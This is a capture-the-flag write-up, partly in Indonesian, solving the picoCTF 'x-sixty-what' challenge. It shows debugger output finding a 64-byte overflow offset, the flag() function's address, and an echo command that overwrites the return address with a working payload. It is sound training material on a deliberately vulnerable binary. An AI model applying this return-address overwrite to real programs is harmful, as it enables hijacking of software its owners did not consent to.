<h1>x-sixty-what</h1>
<h3>Description</h3>
<p>Overflow x64 code
Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this <a href='https://artifacts.picoctf.net/c/64/vuln'>program</a>. Download <a href='https://artifacts.picoctf.net/c/64/vuln.c'>source</a>.
nc saturn.picoctf.net 50171</p>
<h3>Solution</h3>

```console
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  r <<< aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
$rax   : 0x00007fffffffe1d0  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rbx   : 0x00007fffffffe358  →  0x00007fffffffe5fe  →  "/home/xisco/Downloads/vuln"
$rcx   : 0x00007ffff7df6aa0  →  0x00000000fbad2088
$rdx   : 0x0               
$rsp   : 0x00007fffffffe218  →  "jaaaaaaakaaaaaaalaaaaaaamaaa"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x00000000004052d0  →  "gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaama[...]"
$rdi   : 0x00007ffff7df8a40  →  0x0000000000000000
$rip   : 0x00000000004012d1  →  <vuln+001f> ret 
gef➤  pattern search 0x6161616161616169
[+] Searching for '6961616161616161'/'6161616161616169' with period=8
[+] Found at offset 64 (little-endian search) likely
```
<p>fungsi input gets overflow pada offset 64, dan lebar rbp(base pointer) 8 byte untuk 64bit</p>

```console
gef➤  info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010c0  puts@plt
0x00000000004010d0  setresgid@plt
0x00000000004010e0  printf@plt
0x00000000004010f0  fgets@plt
0x0000000000401100  gets@plt
0x0000000000401110  getegid@plt
0x0000000000401120  setvbuf@plt
0x0000000000401130  fopen@plt
0x0000000000401140  exit@plt
0x0000000000401150  _start
0x0000000000401180  _dl_relocate_static_pie
0x0000000000401190  deregister_tm_clones
0x00000000004011c0  register_tm_clones
0x0000000000401200  __do_global_dtors_aux
0x0000000000401230  frame_dummy
0x0000000000401236  flag
0x00000000004012b2  vuln
0x00000000004012d2  main
0x0000000000401340  __libc_csu_init
0x00000000004013b0  __libc_csu_fini
0x00000000004013b8  _fini
```
<p>alamat dari fungsi flag() = 0x0000000000401236, kita bisa menginput 64 byte buffer + 8 byte base pointer + alamat untuk return program ke fungsi flag() yaitu \x36\x12\x40\x00\x00\x00\x00\x00</p>
<pre>
  payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\x36\x12\x40\x00\x00\x00\x00\x00
</pre>

```console
root@xisco-VirtualBox:/home/xisco/Downloads# echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbb\x36\x12\x40\x00\x00\x00\x00\x00" | ./vuln 
Welcome to 64-bit. Give me a string that gets you the flag: 
WIN
Segmentation fault (core dumped)
root@xisco-VirtualBox:/home/xisco/Downloads# 
```
<h3>
Server Bermasalah
</h3>
